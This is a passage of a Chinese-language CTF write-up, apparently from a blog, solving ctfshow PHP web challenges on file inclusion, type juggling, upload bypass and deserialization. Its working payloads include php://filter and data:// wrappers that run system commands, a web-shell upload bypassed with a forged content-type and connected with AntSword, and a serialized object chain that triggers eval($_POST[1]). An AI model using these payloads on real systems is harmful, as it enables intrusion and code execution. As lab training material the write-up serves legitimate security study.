class="meta">&lt;?=</span> <span class="title function_ invoke__">flfgrz</span>(<span class="string">&quot;gnp sy*.*&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后对file&#x3D;后面内容二次url编码 这里要全字符编码 可以用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    clearFlag = <span class="string">&quot;y&quot;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> clearFlag == <span class="string">&quot;y&quot;</span> <span class="keyword">or</span> clearFlag == <span class="string">&quot;Y&quot;</span>:</span><br><span class="line">            os.system(<span class="string">&quot;cls&quot;</span>)</span><br><span class="line">        clearFlag = <span class="string">&quot;&quot;</span></span><br><span class="line">        string = <span class="built_in">input</span>(<span class="string">&quot;请输入需要转换的字符串 :&quot;</span>)</span><br><span class="line">        <span class="built_in">type</span> = <span class="built_in">input</span>(<span class="string">&quot;请选择操作类型(1：加密 2：解密) :&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">type</span> != <span class="string">&quot;1&quot;</span> <span class="keyword">and</span> <span class="built_in">type</span> != <span class="string">&quot;2&quot;</span>):</span><br><span class="line">            <span class="built_in">type</span> = <span class="built_in">input</span>(<span class="string">&quot;操作类型输入错误，请重新选择(1：加密 2：解密) :&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;1&quot;</span> :</span><br><span class="line">            encode_string = encode(string)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;编码结果为：&quot;</span>+encode_string+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;2&quot;</span> :</span><br><span class="line">            decode_string = decode(string)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;解码结果为：&quot;</span>+decode_string+<span class="string">&quot;【请注意前后空格】\n&quot;</span>)</span><br><span class="line">        clearFlag = <span class="built_in">input</span>(<span class="string">&quot;按Y/y清空屏幕继续:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">string</span>):</span><br><span class="line">    encode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encode_char = <span class="built_in">hex</span>(<span class="built_in">ord</span>(char)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>)</span><br><span class="line">        encode_string += encode_char</span><br><span class="line">    <span class="keyword">return</span> encode_string</span><br><span class="line"></span><br><span class="line"><span class="comment">#解码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">string</span>):</span><br><span class="line">    decode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    string_arr = string.split(<span class="string">&quot;%&quot;</span>)</span><br><span class="line">    string_arr.pop(<span class="number">0</span>)           <span class="comment">#删除第一个空元素</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string_arr:</span><br><span class="line">        decode_char = <span class="built_in">chr</span>(<span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+char))</span><br><span class="line">        decode_string += decode_char</span><br><span class="line">    <span class="keyword">return</span> decode_string</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure><p>执行后 访问2.php就可以得到flag了</p><h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里过滤了php但是没过滤冒号 所以可以用data伪协议+base64绕过<br>注意过滤了等号和加号 慢慢调字符和个数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac *.php&#x27;</span>);<span class="keyword">echo</span> <span class="string">&#x27;abcd&#x27;</span>;<span class="meta">?&gt;</span>aa</span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvICdhYmNkJzs/PmFh</span></span><br></pre></td></tr></table></figure><h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查了一手intval 发现一个很有趣的点<br>关于返回值  <code>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</code><br>那么我们传一个非空数组就能绕过了<br><code>/?num[]=a</code></p><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>利用php特性 传入 4476a也会被解析为4476<br><code>/?num=4476a</code></p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>查了查 带上m修饰符后匹配的是多行<br>所以我们可以通过换行符来绕过<br><code>/cmd=%0aphp</code></p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p>这题和web90的区别在于这里的 $num&#x3D;&#x3D;4476 是弱类型比较<br>所以传 4476a绕不过<br>我的做法是 传科学计数法<br><code>/?num=4476e1</code><br>这样就能绕过了</p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还过滤了字母<br>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul><p>所以我们以0开头 转换为8进制即可 010574<br><code>/?num=010574</code></p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题我的做法是用 %0a 绕过strpos的限制<br><code>/?num=%0a010574</code><br>跟着题目hint还学习到了一种姿势:<br>不用进制 用小数绕过<br><code>/?num=4476.0</code></p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里把小数点也过滤掉了<br>这里由于必须要出现0且0不能在首位<br>我们只能在8进制的010574前尝试加特殊字符<br>尝试到 空格和+的时候发现可以绕过<br><code>/?num= 010574 or /?num= 010574</code><br>这里就做个小积累吧</p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这 视频给了一种做法 直接传<br><code>?u=./flag.php</code><br>或者也可以用伪协议来读<br><code>?u=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>经典类型了<br>第一个是弱比较 第二个是强比较<br>POST上传 <code>a[]=1&amp;b[]=2</code> 即可</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>上传图片 尝试bp抓包发现在抓包之前就校验了<br>说明是前台校验<br>查看源代码 找到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button type=<span class="string">&quot;button&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">layui</span>-<span class="title">btn</span>&quot; <span class="title">id</span>=&quot;<span class="title">upload</span>&quot; <span class="title">lay</span>-<span class="title">data</span>=&quot;</span>&#123;url: <span class="string">&#x27;upload.php&#x27;</span>, accept: <span class="string">&#x27;images&#x27;</span>,exts:<span class="string">&#x27;png&#x27;</span>&#125;<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>把exts里面的改为php即可上传成功<br>antsword连接即可找到flag.php</p><h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>这里在上一题基础上加了后端验证<br>将conten-type 改为  <code>image/png</code> 即可绕过<br>这里改为以前常用的 <code>image/jpeg</code> 不行  (猜是因为exts限制为了png?)<br>antsword连接或是进入php页面POST都可以得到flag</p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p>这 原来username 和 password 就是 <code>xxxxxx</code> 🤣<br>那直接传即可</p><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p>cookie中传 <code>user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code><br>注意这里要将序列化的urlencode一下<br>GET传 <code>/?username=xxxxxx&amp;password=xxxxxx</code></p><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><p>把username和password改成不一样即可</p><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><p>这样构造即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = </span><br><span class="line">O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span 